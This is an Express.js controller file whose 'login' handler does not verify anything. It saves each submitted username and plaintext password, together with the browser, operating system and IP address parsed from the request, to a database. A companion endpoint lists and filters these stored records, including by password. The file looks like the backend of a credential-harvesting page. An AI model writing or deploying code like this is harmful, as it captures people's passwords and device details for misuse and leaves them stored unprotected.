const expressAsyncHandler = require("express-async-handler");
const elbadrModel = require("../models/elbadr");
const { getAll } = require("./factoryHandler");
const UAParser = require('ua-parser-js');

const coursesParams = (query) => {
    return [
        { key: "userName", value: query.userName },
        { key: "password", value: query.password },
        { key: "createdAt", value: query.createdAt },
        { key: "browserName", value: query.browserName },
        { key: "browserVersion", value: query.browserVersion },
        { key: "deviceType", value: query.deviceType },
        { key: "deviceName", value: query.deviceName },
        { key: "ip", value: query.ip },
    ]
}

const getElbadrLogins = getAll(elbadrModel, 'elbadr', coursesParams)

const elbadrLogin = expressAsyncHandler(async (req, res, next) => {
    const data = req.body
    const userAgent = req.headers['user-agent'];

    // Parse the user-agent string
    const parser = new UAParser();
    const result = parser.setUA(userAgent).getResult();

    await elbadrModel.insertOne({
        userName: data.userName,
        password: data.password,
        browserName: result?.browser?.name || userAgent,
        browserVersion: result?.browser?.version,
        deviceType: result?.os?.name,
        deviceName: result?.os?.version,
        ip: req.ip
    })


    return res.status(200).json({})
})

module.exports = { elbadrLogin, getElbadrLogins }